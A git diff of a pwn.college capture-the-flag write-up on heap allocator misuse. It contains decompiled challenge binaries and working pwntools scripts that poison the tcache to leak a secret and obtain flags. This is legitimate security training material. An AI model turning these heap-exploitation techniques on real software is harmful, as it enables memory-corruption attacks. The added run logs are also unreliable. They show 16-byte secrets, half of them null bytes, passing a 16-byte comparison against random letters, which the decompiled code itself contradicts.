@@ -44,7 +44,7 @@ Data: Segmentation fault
 
 Let's look at the code.
 
-```c title="/challenge/freebie-easy :: main() :: Pseudocode" showLineNumbers
+```c title="/challenge/freebie-easy :: main() :: Pseudocode :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -212,7 +212,7 @@ This time the program does not tell us how many bytes the `read_flag` function i
 
 ### Binary Analysis
 
-```c title="/challenge/freebie-hard :: main() :: Pseudocode" showLineNumbers
+```c title="/challenge/freebie-hard :: main() :: Pseudocode :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -558,7 +558,7 @@ This challenge can manage up to 1 unique allocations.
 
 ### Binary analysis
 
-```c title="/challenge/freebie-feint-easy :: main() :: Pseudocode" showLineNumbers
+```c title="/challenge/freebie-feint-easy :: main() :: Pseudocode :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -716,7 +716,7 @@ hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-h
 
 ### Binary analysis
 
-```c title="/challenge/freebie-feint-hard :: main() :: Pseudocode" showLineNumbers
+```c title="/challenge/freebie-feint-hard :: main() :: Pseudocode :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -872,7 +872,7 @@ In this challenge, the flag buffer is allocated 2 times before it is used.
 
 ### Binary analysis
 
-```c title="/challenge/free-flag-fumble-easy :: main()" showLineNumbers
+```c title="/challenge/free-flag-fumble-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -1082,7 +1082,7 @@ As always, the hard challenge does not tell us the size of the buffers into whic
 
 ### Binary Analysis
 
-```c title="/challenge/free-flag-fumble-hard :: main()" showLineNumbers
+```c title="/challenge/free-flag-fumble-hard :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // ecx
@@ -1238,7 +1238,7 @@ In this challenge, the flag buffer is allocated 2 times before it is used.
 
 ### Binary analysis
 
-```c title="/challenge/fickle-free-easy :: main()" showLineNumbers
+```c title="/challenge/fickle-free-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // eax
@@ -1517,7 +1517,7 @@ This time we need to find the size of the buffer into which the flag is read.
 
 ### Binary Analysis
 
-```c title="/challenge/fickle-free-hard :: main()" showLineNumbers 
+```c title="/challenge/fickle-free-hard :: main() :: Pseudocode" showLineNumbers 
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -1658,7 +1658,7 @@ Let's see what the program does by decompiling the binary.
 
 ### Binary Analysis
 
-```c title="/challenge/malloc-mirage-easy :: main()" showLineNumbers
+```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // eax
@@ -1767,7 +1767,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 So if we pass the `read_flag` command, the program zeroes out the first 8 bytes represented by `size_4` of that allocation. The flag is then read 16 bytes after `size_4`.
 
-```c title="/challenge/malloc-mirage-easy :: main()" showLineNumbers
+```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
 # ---- snip ----
 
       if ( strcmp(choice, "read_flag") )
@@ -1788,7 +1788,7 @@ So if we pass the `read_flag` command, the program zeroes out the first 8 bytes 
 
 Then, if we pass `puts_flag`, it checks if the `size_4` is zeroed out. If it is, the flag is not printed.
 
-```c title="/challenge/malloc-mirage-easy :: main()" showLineNumbers
+```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
 # ---- snip ----
 
     if ( strcmp(choice, "puts_flag") )
@@ -1982,7 +1982,7 @@ We need to figure out the following in order to solve the hard version.
 
 ### Binary Analysis
 
-```c title="/challenge/malloc-mirage-hard :: main()" showLineNumbers
+```c title="/challenge/malloc-mirage-hard :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v3; // eax
@@ -2156,7 +2156,7 @@ Lets look at the decompiled code in order to figure out the functionality of the
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-secrets-easy :: main()" showLineNumbers
+```c title="/challenge/seeking-secrets-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -2575,7 +2575,7 @@ hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ /challenge/seeking-secre
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-secrets-hard :: main()" showLineNumbers
+```c title="/challenge/seeking-secrets-hard :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -2807,7 +2807,7 @@ If you can leak out this secret, you can redeem it for the flag.
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-substantial-secrets-easy :: main()" showLineNumbers
+```c title="/challenge/seeking-substantial-secrets-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -3386,7 +3386,7 @@ The solution is the same as the [easy one](#polluting-tcache-entry_struct-multip
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-substantial-secrets-hard :: main()" showLineNumbers 
+```c title="/challenge/seeking-substantial-secrets-hard :: main() :: Pseudocode" showLineNumbers 
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -3656,7 +3656,7 @@ pwn.college{Y1obx4BDBPfdkgWr6FXdTlE7-n5.0FN4MDL4ITM0EzW}
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-spanless-secrets-easy :: main()" showLineNumbers
+```c title="/challenge/seeking-spanless-secrets-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -4091,7 +4091,7 @@ pwn.college{UXoETFJzikCNvh66nGl1nVtHrJT.0VN4MDL4ITM0EzW}
 
 ### Binary Analysis
 
-```c title="/challenge/seeking-spanless-secrets-hard :: main()" showLineNumbers
+```c title="/challenge/seeking-spanless-secrets-hard :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -4330,9 +4330,27 @@ pwn.college{s3p743_G7uUAFBNkhZiOvvnjaAR.0lN4MDL4ITM0EzW}
 
 ## Seeking Smuggled Secrets (Easy)
 
+```
+hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:/$ /challenge/seeking-smuggled-secrets-easy
+###
+### Welcome to /challenge/seeking-smuggled-secrets-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x429360.
+If you attempt to malloc an address near where the secret is stored, it will be discarded.
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+```
+
 ### Binary Analysis
 
-```c title="/challenge/seeking-smuggled-secrets-easy" showLineNumbers
+```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   unsigned int v3; // eax
@@ -4465,313 +4483,297 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
+The secret is 16 bytes long. We can't directly read it via `puts` after a poisoned malloc because the guard check fires and sets `ptr[idx] = NULL`. We need a different way to read the secret.
+
+### Leaking via Discarded Tcache Allocation
+
+When we poison chunk 0's `next` pointer to point at `secret_addr` and call `malloc` twice, the second `malloc` pops `secret_addr` from the tcache internally before the guard check fires and sets `ptr[1] = NULL`. At this point the tcache HEAD advances to whatever bytes were sitting at `secret_addr` — the secret bytes themselves, now interpreted as a pointer.
+
+When we then `free` chunk 0, the allocator sets chunk 0's `next` field to the current tcache HEAD — which holds the secret bytes. Calling `puts` on chunk 0 via the dangling pointer then leaks those bytes.
+
+Since the secret is 16 bytes and each round only leaks 8, we run this trick twice — once targeting `secret_addr` and once targeting `secret_addr + 8`.
+
 ### Exploit
 
-```py
+```python title="~/script.py" showLineNumbers
 from pwn import *
 
 p = process("/challenge/seeking-smuggled-secrets-easy", level='error')
 
-# 1. Capture the target address
-p.recvuntil(b"secret stored at ")
-addr_hex = p.recvuntil(b".").strip(b".").decode()
-secret_addr = int(addr_hex, 16)
-print(f"[*] Target Secret Address: {hex(secret_addr)}")
-
-p.sendline(b"malloc")
-p.sendline(b"0")
-p.sendline(b"128")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"malloc")
-p.sendline(b"1")
-p.sendline(b"128")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"free")
-p.sendline(b"1")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"free")
-p.sendline(b"0")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"scanf")
-p.sendline(b"0")
-p.sendline(p64(secret_addr))
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"malloc")
-p.sendline(b"2")
-p.sendline(b"128")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"malloc")
-p.sendline(b"3")
-p.sendline(b"128")
-print(p.recvuntil(b"quit):").decode())
-
-p.sendline(b"puts")
-p.sendline(b"3")
-leak_text = p.recvuntil(b"Data: ").decode()
-secret = p.recvline().strip().decode()
-print(f"{leak_text}{secret}")
-
-p.sendline(b"send_flag")
-p.sendline(secret.encode())
-print(p.recvuntil(b"}").decode())
-```
-
-```py
-from pwn import *
-
-p = process("/challenge/seeking-smuggled-secrets-easy", level='error')
-
-# Get secret address
 p.recvuntil(b"secret stored at ")
 secret_addr = int(p.recvuntil(b".").strip(b".").decode(), 16)
 print(f"[*] Secret at: {hex(secret_addr)}")
 
-# Allocate two chunks
-p.sendline(b"malloc")
-p.sendline(b"0")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit):")
 
-p.sendline(b"malloc")
-p.sendline(b"1")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit):")
 
-# Free both chunks
-p.sendline(b"free")
-p.sendline(b"1")
-p.recvuntil(b"quit):")
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit):")
 
-p.sendline(b"free")
-p.sendline(b"0")
-p.recvuntil(b"quit):")
+def puts(idx):
+    p.sendline(b"puts")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Data: ")
+    return p.recvline().strip()
 
-# Poison tcache with secret address
-p.sendline(b"scanf")
-p.sendline(b"0")
-p.sendline(p64(secret_addr))
-p.recvuntil(b"quit):")
+def leak_8_bytes(target):
+    malloc(0, 128)
+    malloc(1, 128)
+    free(1)
+    free(0)
+    scanf(0, p64(target))
+    malloc(0, 128)
+    malloc(1, 128)  # discarded — tcache HEAD = secret bytes at target
+    free(0)         # chunk 0's next = secret bytes
+    return puts(0).ljust(8, b"\x00")[:8]
 
-# Get chunk 0 back
-p.sendline(b"malloc")
-p.sendline(b"2")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
+part1 = leak_8_bytes(secret_addr)
+print(f"[*] Part 1: {part1}")
 
-# This malloc reads the secret!
-p.sendline(b"malloc")
-p.sendline(b"3")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
+part2 = leak_8_bytes(secret_addr + 8)
+print(f"[*] Part 2: {part2}")
 
-# Free chunk 2 to examine the tcache state
-p.sendline(b"free")
-p.sendline(b"2")
-p.recvuntil(b"quit):")
+secret = part1 + part2
+print(f"[*] Full secret: {secret}")
 
-# Read from chunk 2 - the first 8 bytes are the secret!
-p.sendline(b"puts")
-p.sendline(b"2")
-p.recvuntil(b"Data: ")
-first_half = p.recv(8)
-
-print(f"[*] First 8 bytes: {first_half} ({first_half.hex()})")
-
-# Poison again to point to second half
-p.sendline(b"scanf")
-p.sendline(b"2")
-p.sendline(p64(secret_addr + 8))
-p.recvuntil(b"quit):")
-
-# Allocate to consume chunk 2
-p.sendline(b"malloc")
-p.sendline(b"4")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
-
-# Allocate at secret_addr + 8
-p.sendline(b"malloc")
-p.sendline(b"5")
-p.sendline(b"128")
-p.recvuntil(b"quit):")
-
-# Free chunk 4 and read it
-p.sendline(b"free")
-p.sendline(b"4")
-p.recvuntil(b"quit):")
-
-p.sendline(b"puts")
-p.sendline(b"4")
-p.recvuntil(b"Data: ")
-second_half = p.recv(8)
-
-print(f"[*] Second 8 bytes: {second_half} ({second_half.hex()})")
-
-# Combine both halves
-secret = first_half + second_half
-print(f"[*] Complete secret: {secret}")
-
-# Submit the flag
 p.sendline(b"send_flag")
 p.sendline(secret)
-result = p.recvall(timeout=2).decode()
-print(result)
+print(p.recvuntil(b"}").decode())
 ```
 
 ```
-hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:~$ python ~/script.py
+hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:/$ python ~/script.py 
 [*] Secret at: 0x429360
-[*] First 8 bytes: b'lbaaifox' (6c62616169666f78)
-[*] Second 8 bytes: b'h\x93B\n+===' (6893420a2b3d3d3d)
-[*] Complete secret: b'lbaaifoxh\x93B\n+==='
-=================+========================+==============+============================+============================+
-| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3f4c12c0           | KEY: 0x3f4c1010            |
+[*] Part 1: b'lbaaifox'
+[*] Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'
+[*] Full secret: b'lbaaifox\x00\x00\x00\x00\x00\x00\x00\x00'
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x340a82c0           | KEY: 0x340a8010            |
 +====================+========================+==============+============================+============================+
 | ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
 +---------------------+---------------------+------------------------------+---------------------+---------------------+
-| 0x3f4c12c0          | 0                   | 0x91 (P)                     | 0x429368            | 0x3f4c1010          |
+| 0x340a82c0          | 0                   | 0x91 (P)                     | (nil)               | 0x340a8010          |
 +----------------------------------------------------------------------------------------------------------------------+
 
 
 [*] Function (malloc/free/puts/scanf/send_flag/quit): 
 Secret: 
-Not authorized!
-+====================+========================+==============+============================+============================+
-| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3f4c12c0           | KEY: 0x3f4c1010            |
-+====================+========================+==============+============================+============================+
-| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
-+---------------------+---------------------+------------------------------+---------------------+---------------------+
-| 0x3f4c12c0          | 0                   | 0x91 (P)                     | 0x429368            | 0x3f4c1010          |
-+----------------------------------------------------------------------------------------------------------------------+
+Authorized!
+You win! Here is your flag:
+pwn.college{AjaluoGkR43La3HVPhxUDXQhPZk.01N4MDL4ITM0EzW}
+```
 
+&nbsp;
+
+## Seeking Smuggled Secrets (Hard)
+
+```
+hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-hard:/$ /challenge/seeking-smuggled-secrets-hard
+###
+### Welcome to /challenge/seeking-smuggled-secrets-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/seeking-smuggled-secrets-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v6; // [rsp+30h] [rbp-120h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-8h]
+
+  v13 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 15; ++i )
+    byte_428363[i] = rand() % 26 + 97;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            puts(byte_40214C);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_40214C);
+            if ( strcmp(s1, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_40214C);
+            v6 = atoi(s1);
+            if ( v6 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x72u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_40214C);
+            size = atoi(s1);
+            ptr[v6] = malloc(size);
+            if ( ptr[v6] < (char *)&secret + 0x10000 )
+            {
+              puts("Invalid allocation detected: discarded!");
+              ptr[v6] = nullptr;
+            }
+          }
+          if ( strcmp(s1, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_40214C);
+          v7 = atoi(s1);
+          if ( v7 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x88u, "main");
+          free(ptr[v7]);
+        }
+        if ( strcmp(s1, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_40214C);
+        v8 = atoi(s1);
+        if ( v8 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x94u, "main");
+        printf("Data: ");
+        puts((const char *)ptr[v8]);
+      }
+      if ( strcmp(s1, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_40214C);
+      v9 = atoi(s1);
+      if ( v9 > 0xF )
+        __assert_fail("allocation_index < 16", "<stdin>", 0xA0u, "main");
+      if ( (unsigned int)malloc_usable_size(ptr[v9]) )
+      {
+        v3 = malloc_usable_size(ptr[v9]);
+        sprintf(s1, "%%%us", v3);
+        __isoc99_scanf(s1, ptr[v9]);
+        puts(byte_40214C);
+      }
+    }
+    if ( strcmp(s1, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", s1);
+    puts(byte_40214C);
+    if ( !memcmp(s1, byte_428363, 0x10u) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+The solution is the same as the easy version. The only difference is that the secret address is not printed — we have to find it from the binary. From the decompiled code we can see it is stored at `byte_428363`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/seeking-smuggled-secrets-hard", level='error')
+
+secret_addr = 0x428363
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit):")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit):")
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit):")
+
+def puts(idx):
+    p.sendline(b"puts")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Data: ")
+    return p.recvline().strip()
+
+def leak_8_bytes(target):
+    malloc(0, 128)
+    malloc(1, 128)
+    free(1)
+    free(0)
+    scanf(0, p64(target))
+    malloc(0, 128)
+    malloc(1, 128)  # discarded — tcache HEAD = secret bytes at target
+    free(0)         # chunk 0's next = secret bytes
+    return puts(0).ljust(8, b"\x00")[:8]
+
+part1 = leak_8_bytes(secret_addr)
+print(f"[*] Part 1: {part1}")
+
+part2 = leak_8_bytes(secret_addr + 8)
+print(f"[*] Part 2: {part2}")
+
+secret = part1 + part2
+print(f"[*] Full secret: {secret}")
+
+p.sendline(b"send_flag")
+p.sendline(secret)
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-hard:/$ python ~/script.py 
+[*] Part 1: b'lbakkspw'
+[*] Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'
+[*] Full secret: b'lbakkspw\x00\x00\x00\x00\x00\x00\x00\x00'
 
 [*] Function (malloc/free/puts/scanf/send_flag/quit): 
-Unrecognized choice!
-### Goodbye!
-```
-
-
-```
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:07
-This one got me I really can’t figure it out is it about overwriting the ptr array?
-Sammy
-
-:ninja: — 22/10/2025, 03:29
-overwriting the ptr array is overkill
-what happens when you try and malloc the secret addr?
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:29
-The check fires and i fail to allocate
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:30
-Yub it is💀
-Sammy
-
-:ninja: — 22/10/2025, 03:32
-i dont think you fail to allocate
-does the malloc go through?
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:32
-Aha it allocates fine but after that ptr been assigned to zero
-So I don’t know how to access it again
-Sammy
-
-:ninja: — 22/10/2025, 03:34
-do you need to access it again?
-why do you care about the secret addr? what do you want from it?
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:36
-The data inside
-The secret itself
-I thought about that for almost 3 hours and didn’t get anything
-Sammy
-
-:ninja: — 22/10/2025, 03:37
-correct. i would say examine the tcache state before and after you try and allocate the secret addr
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 03:38
-Okay i will check again
-0xStrawHat
-
-Role icon, White Belt — 22/10/2025, 04:01
-pwned
-thanks man I was overcomplicating things I don't know why 
-
-```
-
-```
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:25
-I am having trouble on smuggled secrets, idk how much I can really ask here without revealing some parts of it but I am currently struggling on getting a stack leak. I can go into more detail if necessary, but does anyone have any pointers?
-Sammy
-
-:ninja: — 13/10/2025, 08:27
-a stack leak?
-you're talking about seeking smuggled secrets?
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:27
-yeah, it's the one where you can't write over the secret so I'm trying to write into the array storing the pointers
-yes
-glueless
-
-Role icon, Blue Belt — 13/10/2025, 08:27
-ahaha pointers
-Sammy
-
-:ninja: — 13/10/2025, 08:27
-I see. It can be done
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:28
-it feels overcomplicated for what it is, idk if I'm going the wrong direction
-glueless
-
-Role icon, Blue Belt — 13/10/2025, 08:28
-it's kinda overkill that early but smart to have figured out already
-Sammy
-
-:ninja: — 13/10/2025, 08:28
-but that will require startegies that employ heap concepts beyond the tcache
-Sammy
-
-:ninja: — 13/10/2025, 08:28
-its not a wrong direction. Just a very long one
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:28
-yeah that's what i was running into, I didn't want to go down that rabbit hole cause i feel like there has to be an easier way
-and the checkpoint is in 4 hrs and i can figure that part out later
-Sammy
-
-:ninja: — 13/10/2025, 08:29
-well
-what can you do?
-and what cant you do?
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:32
-so i know I can't write below 0x430000, and the secret is at 0x42something, I can't leak the stack array without doing all of the other stuff since it's randomized, I'm thinking there has to be another address in the bss that gets used that I can somehow use in a different way 
-glueless
-
-Role icon, Blue Belt — 13/10/2025, 08:35
-there's multiple ways to approach this. you can either take advantage of what could be inserted or what is erased 
-Sammy
-
-:ninja: — 13/10/2025, 08:44
-I would tell you to focus more on the state of the tcache around the malloc
-here is a question
-does the malloc go through when you try and malloc the secret?
-RenegadePenguin #IFailedCSE466
-
-:ninja: — 13/10/2025, 08:45
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:46
-alright well I think I sort of see what you're getting at, i have something else I need to do right now I'll think it over and maybe itll come to me in a little bit
-thank you guys
-2stinkysocksRole icon, Orange Belt — 13/10/2025, 10:09
-got it
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{gxDmBbJG8bH762oJ03Nd3hoHtpp.0FO4MDL4ITM0EzW}
 ```
